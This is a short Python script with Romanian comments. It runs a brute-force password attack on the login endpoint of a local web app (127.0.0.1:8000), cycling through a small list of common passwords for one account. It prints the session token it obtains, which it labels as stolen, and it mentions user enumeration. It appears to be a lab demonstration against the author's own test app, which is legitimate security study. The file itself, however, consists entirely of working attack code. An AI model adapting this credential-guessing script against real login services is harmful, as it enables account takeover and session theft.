import requests
import time


URL = "http://127.0.0.1:8000/login"
TARGET_EMAIL = "hacker@authx.com"


PASSWORD_LIST = [
    "123456",
    "password",
    "admin123",
    "qwerty",
    "123",
    "hacker99"
]

print(f"[*] Începem atacul de Brute Force asupra contului: {TARGET_EMAIL}")
print("[*] --------------------------------------------------")

for password in PASSWORD_LIST:
    print(f"[*] Încercăm parola: '{password}'...")
    
    payload = {
        "email": TARGET_EMAIL,
        "password": password
    }
    
    # Trimitem request-ul POST
    response = requests.post(URL, json=payload)
    
    # Analizăm răspunsul
    if response.status_code == 200:
        print(f"\n[+] SUCCES! Parola a fost găsită: '{password}'")
        print(f"[+] Token-ul de sesiune furat: {response.json().get('token')}")
        break
    elif response.status_code == 401:
        print("[-] Eșuat: Parolă greșită.")
    elif response.status_code == 404:
        print("[-] Eșuat: Userul nu există (User Enumeration ne-ar fi spus asta deja!).")
        break
    else:
        print(f"[-] Eroare neașteptată: {response.status_code}")
        
    time.sleep(0.5)

print("\n[*] Atacul s-a încheiat.")
